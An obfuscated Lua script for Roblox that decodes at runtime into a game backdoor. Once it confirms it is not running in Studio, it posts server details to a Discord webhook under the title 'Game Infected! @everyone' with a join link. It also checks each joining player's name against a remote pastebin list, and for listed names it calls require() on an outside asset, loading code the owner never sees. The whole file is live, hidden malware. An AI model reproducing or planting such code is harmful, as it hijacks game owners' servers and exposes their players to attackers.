local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v82=v2(v0(v30,16));if v19 then local v88=0;local v89;while true do if (v88==0) then v89=v5(v82,v19);v19=nil;v88=1;end if (v88==1) then return v89;end end else return v82;end end end);local function v20(v31,v32,v33) if v33 then local v83=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + 1)) ;return v83-(v83%(1638 -(1523 + 114))) ;else local v84=931 -(857 + 74) ;local v85;while true do if (v84==(568 -(367 + 201))) then v85=(929 -(214 + 713))^(v32-(1 + 0)) ;return (((v31%(v85 + v85))>=v85) and (1 + 0 + 0)) or (877 -((401 -119) + 595)) ;end end end end local function v21() local v34=1065 -(68 + 997) ;local v35;while true do if (v34==(1270 -(226 + 1044))) then v35=v1(v16,v18,v18);v18=v18 + (4 -3) ;v34=118 -(32 + 19 + 66) ;end if (v34==(1 + 0)) then return v35;end end end local function v22() local v36=0 -0 ;local v37;local v38;while true do if (v36==1) then return (v38 * (606 -(87 + 263))) + v37 ;end if (v36==(957 -(892 + 48 + 17))) then v37,v38=v1(v16,v18,v18 + (4 -2) );v18=v18 + (3 -1) ;v36=1;end end end local function v23() local v39,v40,v41,v42=v1(v16,v18,v18 + ((9 + 2) -8) );v18=v18 + (956 -((1799 -(915 + 82)) + 150)) ;return (v42 * 16777216) + (v41 * (176444 -110908)) + (v40 * (464 -208)) + v39 ;end local function v24() local v43=0;local v44;local v45;local v46;local v47;local v48;local v49;while true do if ((0 -0)==v43) then v44=v23();v45=v23();v43=(7 -5) -1 ;end if (v43==(2 + 1)) then if (v48==(0 -0)) then if (v47==(1187 -(1069 + 118))) then return v49 * (0 -0) ;else local v100=0;while true do if (v100==0) then v48=1 -0 ;v46=0 + 0 ;break;end end end elseif (v48==(3636 -1589)) then return ((v47==(0 + 0)) and (v49 * ((792 -(368 + 423))/0))) or (v49 * NaN) ;end return v8(v49,v48-(3214 -2191) ) * (v46 + (v47/(2^(70 -(10 + (867 -(814 + 45))))))) ;end if (v43==(3 -2)) then v46=443 -((1024 -608) + 26) ;v47=(v20(v45,(1 + 2) -2 ,9 + 11 ) * ((3 -1)^(470 -(145 + 104 + 189)))) + v44 ;v43=432 -(44 + 386) ;end if (v43==(1488 -(998 + 488))) then v48=v20(v45,7 + 14 ,(911 -(261 + 624)) + 5 );v49=((v20(v45,56 -24 )==(773 -(201 + (1651 -(1020 + 60))))) and  -(1139 -(116 + 1022))) or (4 -(1426 -(630 + 793))) ;v43=2 + 1 ;end end end local function v25(v50) local v51=0;local v52;local v53;while true do if (v51==(3 -2)) then v52=v3(v16,v18,(v18 + v50) -(4 -3) );v18=v18 + v50 ;v51=2;end if (v51==((5 -3) + 1)) then return v6(v53);end if (v51==(0 -0)) then v52=nil;if  not v50 then v50=v23();if (v50==0) then return "";end end v51=1748 -(760 + 987) ;end if (v51==(1915 -(1789 + 124))) then v53={};for v90=767 -(745 + 21) , #v52 do v53[v90]=v2(v1(v3(v52,v90,v90)));end v51=(7 -5) + 1 ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v54=0;local v55;local v56;local v57;local v58;local v59;local v60;while true do local v67=0;while true do if (v67==(0 + 0)) then if (v54~=0) then else local v98=0 -0 ;while true do if (v98==(7 -5)) then v54=868 -(550 + 317) ;break;end if (0==v98) then v55={};v56={};v98=1;end if ((1 -0)==v98) then v57={};v58={v55,v56,nil,v57};v98=2;end end end if (v54==(1666 -(970 + 695))) then v59=v23();v60={};for v101=1,v59 do local v102=0 -0 ;local v103;local v104;local v105;while true do if (v102~=1) then else v105=nil;while true do if (v103~=(1991 -(582 + 1408))) then else if (v104==1) then v105=v21()~=0 ;elseif (v104==(6 -4)) then v105=v24();elseif (v104~=3) then else v105=v25();end v60[v101]=v105;break;end if (v103==(0 -0)) then local v114=0;while true do if (v114==(0 -0)) then v104=v21();v105=nil;v114=1;end if ((1825 -(1195 + 629))~=v114) then else v103=1;break;end end end end break;end if ((0 -0)~=v102) then else local v112=241 -(187 + 54) ;while true do if (v112==1) then v102=1;break;end if ((780 -(162 + 618))~=v112) then else v103=0 + 0 ;v104=nil;v112=1 + 0 ;end end end end end v58[6 -3 ]=v21();v54=2;end v67=1;end if (v67==1) then if (v54~=2) then else for v106=1 -0 ,v23() do local v107=0 + 0 ;local v108;local v109;while true do if (v107==(1636 -(1373 + 263))) then v108=0;v109=nil;v107=1;end if (v107==(1001 -(451 + 549))) then while true do if (v108==0) then v109=v21();if (v20(v109,1,1)~=0) then else local v115=0 + 0 ;local v116;local v117;local v118;local v119;while true do if (v115~=(0 -0)) then else local v234=0 -0 ;local v235;while true do if (v234~=(1384 -(746 + 638))) then else v235=0;while true do if (v235~=1) then else v115=1 + 0 ;break;end if (v235==0) then v116=0 -0 ;v117=nil;v235=1;end end break;end end end if (v115~=2) then else while true do if (v116==(342 -(218 + 123))) then local v431=0;local v432;while true do if (v431==(1581 -(1535 + 46))) then v432=0 + 0 ;while true do if (v432==(0 + 0)) then v119={v22(),v22(),nil,nil};if (v117==(0 + 0)) then local v447=0;while true do if (v447==0) then v119[7 -4 ]=v22();v119[4]=v22();break;end end elseif (v117==(604 -(268 + 335))) then v119[3]=v23();elseif (v117==2) then v119[293 -(60 + 230) ]=v23() -(2^16) ;elseif (v117~=3) then else local v452=572 -(426 + 146) ;local v453;while true do if (v452~=(0 + 0)) then else v453=1456 -(282 + 1174) ;while true do if (v453==(811 -(569 + 242))) then v119[8 -5 ]=v23() -((1 + 1)^(1040 -(706 + 318))) ;v119[4]=v22();break;end end break;end end end v432=1252 -(721 + 530) ;end if ((1272 -(945 + 326))==v432) then v116=2;break;end end break;end end end if (v116==(0 -0)) then local v433=0;local v434;while true do if ((0 + 0)~=v433) then else v434=0;while true do if (v434==(701 -(271 + 429))) then v116=1 + 0 ;break;end if (v434==0) then v117=v20(v109,2,3);v118=v20(v109,4,1506 -(1408 + 92) );v434=1087 -(461 + 625) ;end end break;end end end if (v116~=2) then else local v435=0;while true do if (v435==1) then v116=1291 -(993 + 295) ;break;end if (v435~=0) then else if (v20(v118,1,1)==(1 + 0)) then v119[1173 -(418 + 753) ]=v60[v119[2]];end if (v20(v118,1 + 1 ,1 + 1 )==(1 + 0)) then v119[1 + 2 ]=v60[v119[532 -(406 + 123) ]];end v435=1770 -(1749 + 20) ;end end end if (3~=v116) then else if (v20(v118,1 + 2 ,1325 -(1249 + 73) )~=1) then else v119[2 + 2 ]=v60[v119[1149 -(466 + 679) ]];end v55[v106]=v119;break;end end break;end if (v115~=1) then else local v236=0 -0 ;local v237;while true do if (v236~=(0 -0)) then else v237=0;while true do if (v237==0) then v118=nil;v119=nil;v237=1;end if (v237==(1901 -(106 + 1794))) then v115=2;break;end end break;end end end end end break;end end break;end end end for v110=1 + 0 ,v23() do v56[v110-1 ]=v28();end return v58;end break;end end end end local function v29(v61,v62,v63) local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...) local v68=v64;local v69=v65;local v70=v66;local v71=v27;local v72=1;local v73= -1;local v74={};local v75={...};local v76=v12("#",...) -1 ;local v77={};local v78={};for v86=0,v76 do if (v86>=v70) then v74[v86-v70 ]=v75[v86 + 1 ];else v78[v86]=v75[v86 + 1 ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do local v87=0;while true do if (v87==0) then v80=v68[v72];v81=v80[1];v87=1;end if (1==v87) then if (v81<=18) then if (v81<=8) then if (v81<=3) then if (v81<=1) then if (v81>0) then v78[v80[2]]=v78[v80[3]];else local v122=0;local v123;local v124;local v125;while true do if (1==v122) then v125=v80[3];for v337=1,v125 do v124[v337]=v78[v123 + v337 ];end break;end if (v122==0) then v123=v80[2];v124=v78[v123];v122=1;end end end elseif (v81==2) then local v126=v80[2];v78[v126](v78[v126 + 1 ]);else local v127=0;local v128;local v129;while true do if (v127==5) then v78[v129 + 1 ]=v128;v78[v129]=v128[v80[4]];break;end if (v127==2) then v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v129=v80[2];v127=3;end if (v127==0) then v128=nil;v129=nil;v129=v80[2];v128=v78[v80[3]];v127=1;end if (v127==1) then v78[v129 + 1 ]=v128;v78[v129]=v128[v80[4]];v72=v72 + 1 ;v80=v68[v72];v127=2;end if (v127==3) then v78[v129]=v78[v129](v13(v78,v129 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v127=4;end if (v127==4) then v72=v72 + 1 ;v80=v68[v72];v129=v80[2];v128=v78[v80[3]];v127=5;end end end elseif (v81<=5) then if (v81==4) then for v184=v80[2],v80[3] do v78[v184]=nil;end else v78[v80[2]]=v80[3];end elseif (v81<=6) then local v132;local v133;v63[v80[3]]=v78[v80[2]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v80=v68[v72];v133=v80[2];v132=v78[v80[3]];v78[v133 + 1 ]=v132;v78[v133]=v132[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v133=v80[2];v78[v133]=v78[v133](v13(v78,v133 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v133=v80[2];v132=v78[v80[3]];v78[v133 + 1 ]=v132;v78[v133]=v132[v80[4]];elseif (v81>7) then local v189=0;local v190;while true do if (v189==0) then v190=nil;v78[v80[2]]=v80[3];v72=v72 + 1 ;v189=1;end if (v189==2) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v189=3;end if (v189==3) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v189=4;end if (v189==1) then v80=v68[v72];v190=v80[2];v78[v190]=v78[v190](v78[v190 + 1 ]);v189=2;end if (v189==4) then v72=v72 + 1 ;v80=v68[v72];v190=v80[2];v189=5;end if (v189==5) then v78[v190](v78[v190 + 1 ]);break;end end else local v191=0;local v192;local v193;while true do if (v191==7) then if  not v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end break;end if (v191==6) then v193=v80[2];v78[v193]=v78[v193](v78[v193 + 1 ]);v72=v72 + 1 ;v80=v68[v72];v191=7;end if (v191==4) then v72=v72 + 1 ;v80=v68[v72];v193=v80[2];v192=v78[v80[3]];v191=5;end if (5==v191) then v78[v193 + 1 ]=v192;v78[v193]=v192[v80[4]];v72=v72 + 1 ;v80=v68[v72];v191=6;end if (v191==2) then v78[v193]=v192[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v191=3;end if (v191==0) then v192=nil;v193=nil;v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v191=1;end if (v191==1) then v80=v68[v72];v193=v80[2];v192=v78[v80[3]];v78[v193 + 1 ]=v192;v191=2;end if (v191==3) then v72=v72 + 1 ;v80=v68[v72];v193=v80[2];v78[v193]=v78[v193](v13(v78,v193 + 1 ,v80[3]));v191=4;end end end elseif (v81<=13) then if (v81<=10) then if (v81==9) then local v144=0;local v145;local v146;local v147;while true do if (v144==7) then for v340=1,v145 do v146[v340]=v78[v147 + v340 ];end break;end if (v144==1) then v78[v80[2]][v80[3]]=v78[v80[4]];v72=v72 + 1 ;v80=v68[v72];v144=2;end if (0==v144) then v145=nil;v146=nil;v147=nil;v144=1;end if (5==v144) then v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v80=v68[v72];v144=6;end if (6==v144) then v147=v80[2];v146=v78[v147];v145=v80[3];v144=7;end if (v144==4) then v78[v80[2]][v80[3]]=v78[v80[4]];v72=v72 + 1 ;v80=v68[v72];v144=5;end if (v144==3) then v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v80=v68[v72];v144=4;end if (v144==2) then v78[v80[2]]={};v72=v72 + 1 ;v80=v68[v72];v144=3;end end elseif  not v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=11) then local v148=v80[2];v78[v148]=v78[v148](v13(v78,v148 + 1 ,v80[3]));elseif (v81>12) then v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];else v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]= #v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];end elseif (v81<=15) then if (v81>14) then if v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end else local v150=0;local v151;local v152;local v153;while true do if (v150==2) then for v343=1,v80[4] do v72=v72 + 1 ;local v344=v68[v72];if (v344[1]==1) then v153[v343-1 ]={v78,v344[3]};else v153[v343-1 ]={v62,v344[3]};end v77[ #v77 + 1 ]=v153;end v78[v80[2]]=v29(v151,v152,v63);break;end if (v150==0) then v151=v69[v80[3]];v152=nil;v150=1;end if (v150==1) then v153={};v152=v10({},{__index=function(v346,v347) local v348=0;local v349;while true do if (v348==0) then v349=v153[v347];return v349[1][v349[2]];end end end,__newindex=function(v350,v351,v352) local v353=v153[v351];v353[1][v353[2]]=v352;end});v150=2;end end end elseif (v81<=16) then v63[v80[3]]=v78[v80[2]];elseif (v81>17) then local v207=0;local v208;local v209;while true do if (v207==0) then v208=nil;v209=nil;v209=v80[2];v208=v78[v80[3]];v78[v209 + 1 ]=v208;v78[v209]=v208[v80[4]];v207=1;end if (v207==4) then v78[v209]=v208[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v80=v68[v72];v207=5;end if (v207==6) then v80=v68[v72];v72=v80[3];break;end if (2==v207) then v78[v209]=v78[v209](v13(v78,v209 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v207=3;end if (v207==1) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v62[v80[3]];v72=v72 + 1 ;v80=v68[v72];v209=v80[2];v207=2;end if (v207==5) then v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v80=v68[v72];v209=v80[2];v78[v209](v13(v78,v209 + 1 ,v80[3]));v72=v72 + 1 ;v207=6;end if (v207==3) then v78[v80[2]]=v62[v80[3]];v72=v72 + 1 ;v80=v68[v72];v209=v80[2];v208=v78[v80[3]];v78[v209 + 1 ]=v208;v207=4;end end else v72=v80[3];end elseif (v81<=28) then if (v81<=23) then if (v81<=20) then if (v81==19) then v78[v80[2]]=v29(v69[v80[3]],nil,v63);else v78[v80[2]]=v63[v80[3]];end elseif (v81<=21) then local v159=v80[2];local v160=v78[v80[3]];v78[v159 + 1 ]=v160;v78[v159]=v160[v80[4]];elseif (v81==22) then if (v78[v80[2]]==v80[4]) then v72=v72 + 1 ;else v72=v80[3];end else v78[v80[2]]=v62[v80[3]];end elseif (v81<=25) then if (v81>24) then v78[v80[2]]= #v78[v80[3]];else v78[v80[2]][v80[3]]=v80[4];end elseif (v81<=26) then local v167=0;local v168;local v169;while true do if (3==v167) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]][v80[3]]=v80[4];v72=v72 + 1 ;v80=v68[v72];v167=4;end if (v167==6) then v168=v78[v169];for v356=v169 + 1 ,v80[4] do v168=v168   .. v78[v356] ;end v78[v80[2]]=v168;break;end if (v167==2) then v80=v68[v72];v78[v80[2]]={};v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]={};v167=3;end if (v167==0) then v168=nil;v169=nil;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v167=1;end if (v167==5) then v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v169=v80[3];v167=6;end if (4==v167) then v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v167=5;end if (v167==1) then v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]={};v72=v72 + 1 ;v167=2;end end elseif (v81>27) then local v213=0;local v214;while true do if (v213==0) then v214=v80[2];v78[v214]=v78[v214](v78[v214 + 1 ]);break;end end else do return;end end elseif (v81<=33) then if (v81<=30) then if (v81==29) then local v170=v80[2];local v171={};for v186=1, #v77 do local v187=v77[v186];for v215=0, #v187 do local v216=v187[v215];local v217=v216[1];local v218=v216[2];if ((v217==v78) and (v218>=v170)) then v171[v218]=v217[v218];v216[1]=v171;end end end else v78[v80[2]]=v78[v80[3]][v80[4]];end elseif (v81<=31) then local v174=0;local v175;local v176;while true do if (v174==1) then for v360=v175 + 1 ,v80[3] do v7(v176,v78[v360]);end break;end if (v174==0) then v175=v80[2];v176=v78[v175];v174=1;end end elseif (v81==32) then v78[v80[2]]={};else v78[v80[2]][v80[3]]=v78[v80[4]];end elseif (v81<=35) then if (v81==34) then local v177=v80[3];local v178=v78[v177];for v188=v177 + 1 ,v80[4] do v178=v178   .. v78[v188] ;end v78[v80[2]]=v178;else local v180=v80[2];v78[v180](v13(v78,v180 + 1 ,v80[3]));end elseif (v81<=36) then local v181=0;local v182;local v183;while true do if (v181==6) then v183=v80[2];v182=v78[v80[3]];v78[v183 + 1 ]=v182;v78[v183]=v182[v80[4]];v181=7;end if (v181==4) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v181=5;end if (v181==5) then v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v181=6;end if (v181==8) then v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v72=v72 + 1 ;v181=9;end if (v181==9) then v80=v68[v72];v78[v80[2]]=v80[3];break;end if (v181==7) then v72=v72 + 1 ;v80=v68[v72];v183=v80[2];v78[v183]=v78[v183](v78[v183 + 1 ]);v181=8;end if (0==v181) then v182=nil;v183=nil;v183=v80[2];v182=v78[v80[3]];v181=1;end if (v181==1) then v78[v183 + 1 ]=v182;v78[v183]=v182[v80[4]];v72=v72 + 1 ;v80=v68[v72];v181=2;end if (v181==2) then v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v183=v80[2];v181=3;end if (v181==3) then v78[v183]=v78[v183](v13(v78,v183 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]];v181=4;end end elseif (v81>37) then v78[v80[2]]();else local v222;local v223;v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v63[v80[3]];v72=v72 + 1 ;v80=v68[v72];v223=v80[2];v222=v78[v80[3]];v78[v223 + 1 ]=v222;v78[v223]=v222[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v223=v80[2];v78[v223]=v78[v223](v13(v78,v223 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v223=v80[2];v222=v78[v80[3]];v78[v223 + 1 ]=v222;v78[v223]=v222[v80[4]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[3];v72=v72 + 1 ;v80=v68[v72];v223=v80[2];v78[v223]=v78[v223](v13(v78,v223 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + 1 ;v80=v68[v72];v223=v80[2];v78[v223]=v78[v223](v13(v78,v223 + 1 ,v80[3]));v72=v72 + 1 ;v80=v68[v72];if v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end end v72=v72 + 1 ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!273O0003043O0067616D65030A3O0047657453657276696365030A3O0052756E5365727669636503083O00497353747564696F028O00027O004003073O00506C6179657273030A3O004D6178506C617965727303063O00656D6265647303053O007469746C6503183O0047616D6520496E66656374656421204065766572796F6E652O033O0075726C03193O00682O7470733A2O2F726F626C6F782E636F6D2F67616D65732F03073O00506C6163654964030B3O006465736372697074696F6E030D3O002O2A506C61796572733A2O2A2003013O002F030E3O000A2O2A47616D652049643A2O2A2003133O000A2O2A47616D652056657273696F6E3A2O2A20030C3O00506C61636556657273696F6E030E3O000A2O2A4A6F622049643A2O2A206003053O004A6F62496403143O00600A204A61766173637269707420436F64653A2003373O003O606A730A2B6A6176617363726970743A526F626C6F782E47616D654C61756E636865722E6A6F696E47616D65496E7374616E6365282O033O002C202203063O0022290A3O6003063O00662O6F74657203083O0069636F6E5F75726C034O0003053O00636F6C6F72023O00C07F2E5641026O00F03F026O000840030B3O00506C61796572412O64656403073O00436F2O6E65637403843O00682O7470733A2O2F776562682O6F6B2E6C65776973616B7572612E6D6F652F6170692F776562682O6F6B732F3132343732302O3334393532373339363339322F43316770476950324B7172765F726A2D36386B473635587072765A4E65786D306C315851687A4E577058436C756264317338764A306E436C546C543670317A6C5131677503073O0073656E64776562030B3O00482O747053657276696365030A3O00476574506C617965727300733O0012073O00013O00206O000200122O000200038O0002000200206O00046O0002000200064O0072000100010004113O007200010012053O00054O0004000100043O0026163O003F000100060004113O003F0001001205000500053O0026160005003A000100050004113O003A0001001214000600013O00201A00060006000700202O0003000600084O00063O00014O000700016O00083O000500302O0008000A000B00122O0009000D3O00122O000A00013O00202O000A000A000E4O00090009000A0010210008000C000900120C000900106O000A00023O00122O000B00116O000C00033O00122O000D00123O00122O000E00013O00202O000E000E000E00122O000F00133O00122O001000013O00202O001000100014001205001100153O00120D001200013O00202O00120012001600122O001300173O00122O001400183O00122O001500013O00202O00150015000E00122O001600193O00122O001700013O00202O00170017001600122O0018001A4O00220009000900180010090008000F00094O00093O000100302O0009001C001D00102O0008001B000900302O0008001E001F4O0007000100010010210006000900072O0001000400063O001205000500203O0026160005000D000100200004113O000D00010012053O00213O0004113O003F00010004113O000D00010026163O004C000100050004113O004C0001001214000500013O00200300050005000200122O000700076O00050007000200202O00050005002200202O00050005002300021300076O0023000500070001001205000500243O0012100005000C3O0012053O00203O0026163O005B000100210004113O005B000100060E00050001000100022O00013O00014O00013O00043O001206000500253O00122O000500013O00202O00050005000200122O000700076O00050007000200202O00050005002200202O000500050023000213000700024O00230005000700010004113O007100010026163O000A000100200004113O000A0001001205000500053O00261600050062000100200004113O006200010012053O00063O0004113O000A00010026160005005E000100050004113O005E0001001214000600013O00202400060006000200122O000800266O0006000800024O000100063O00122O000600013O00202O00060006000700202O0006000600274O0006000200024O000200063O00122O000500203O0004113O005E00010004113O000A00012O001D8O001B3O00013O00033O00023O00030E3O00436861726163746572412O64656403073O00436F2O6E65637401053O00201E00013O000100201500010001000200021300036O00230001000300012O001B3O00013O00013O000B3O0003063O00737472696E6703043O0066696E6403043O0067616D65030A3O0047657453657276696365030B3O00482O74705365727669636503083O004765744173796E6303213O00682O7470733A2O2F706173746562696E2E636F6D2F7261772F674C35764466795603043O004E616D6503073O0072657175697265022O00B04A1B13F54103073O00507269766F746501143O001225000100013O00202O00010001000200122O000200033O00202O00020002000400122O000400056O00020004000200202O00020002000600122O000400076O00020004000200202O00033O00084O00010003000200062O0001001300013O0004113O00130001001214000100093O0012080002000A6O00010002000200202O00010001000B00202O00023O00084O0001000200012O001B3O00017O00043O00028O00030A3O004A534F4E456E636F646503093O00506F73744173796E632O033O0075726C00113O0012053O00014O0004000100013O0026163O0002000100010004113O000200012O001700025O0020120002000200024O000400016O0002000400024O000100026O00025O00202O00020002000300122O000400046O000500016O00020005000100044O001000010004113O000200012O001B3O00017O00013O0003073O0073656E6477656201033O001214000100014O00260001000100012O001B3O00017O00",v9(),...);
